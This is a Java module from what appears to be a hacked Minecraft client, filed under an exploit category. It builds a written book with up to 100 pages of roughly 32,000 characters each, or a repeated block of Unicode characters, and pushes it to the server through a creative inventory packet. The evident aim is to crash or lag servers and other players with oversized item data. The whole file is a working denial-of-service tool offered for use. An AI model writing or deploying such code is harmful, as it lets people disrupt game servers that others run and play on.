package dev.oblivion.client.module.exploit;

import dev.oblivion.client.event.EventHandler;
import dev.oblivion.client.event.events.TickEvent;
import dev.oblivion.client.module.Category;
import dev.oblivion.client.module.Module;
import dev.oblivion.client.setting.impl.IntSetting;
import dev.oblivion.client.setting.impl.EnumSetting;
import net.minecraft.component.DataComponentTypes;
import net.minecraft.component.type.WrittenBookContentComponent;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.CreativeInventoryActionC2SPacket;
import net.minecraft.text.RawFilteredPair;
import net.minecraft.text.Text;

import java.util.ArrayList;
import java.util.List;
import java.util.Optional;

public class BookExploit extends Module {

    public enum Mode { LARGE_NBT, MAX_PAGES, UNICODE_SPAM }

    private final EnumSetting<Mode> mode = settings.getDefaultGroup().add(
        new EnumSetting.Builder<Mode>().name("Mode").description("Book exploit method.").defaultValue(Mode.LARGE_NBT).build()
    );
    private final IntSetting pages = settings.getDefaultGroup().add(
        new IntSetting.Builder().name("Pages").description("Number of pages.").defaultValue(100).min(1).max(100).build()
    );

    public BookExploit() {
        super("BookExploit", "Creates books with oversized data.", Category.EXPLOIT);
    }

    @Override
    protected void onEnable() {
        if (mc.player == null || mc.getNetworkHandler() == null) {
            disable();
            return;
        }
        if (!mc.player.getAbilities().creativeMode) {
            if (mc.player != null) mc.player.sendMessage(Text.literal("\u00a7c[BookExploit] Requires creative mode."), false);
            disable();
            return;
        }

        ItemStack book = new ItemStack(Items.WRITTEN_BOOK, 1);
        List<RawFilteredPair<Text>> bookPages = new ArrayList<>();

        String content;
        switch (mode.get()) {
            case LARGE_NBT -> content = "\u00a7k" + "A".repeat(32000);
            case UNICODE_SPAM -> {
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < 5000; i++) sb.append("\u2588\u2592\u2591");
                content = sb.toString();
            }
            default -> content = "A".repeat(32000);
        }

        for (int i = 0; i < pages.get(); i++) {
            bookPages.add(RawFilteredPair.of(Text.literal(content)));
        }

        book.set(DataComponentTypes.WRITTEN_BOOK_CONTENT,
            new WrittenBookContentComponent(
                RawFilteredPair.of("Exploit"),
                "Oblivion",
                0,
                bookPages,
                true
            )
        );

        mc.player.networkHandler.sendPacket(new CreativeInventoryActionC2SPacket(36, book));
        mc.player.sendMessage(Text.literal("\u00a7a[BookExploit] Book created in slot."), false);
        disable();
    }
}
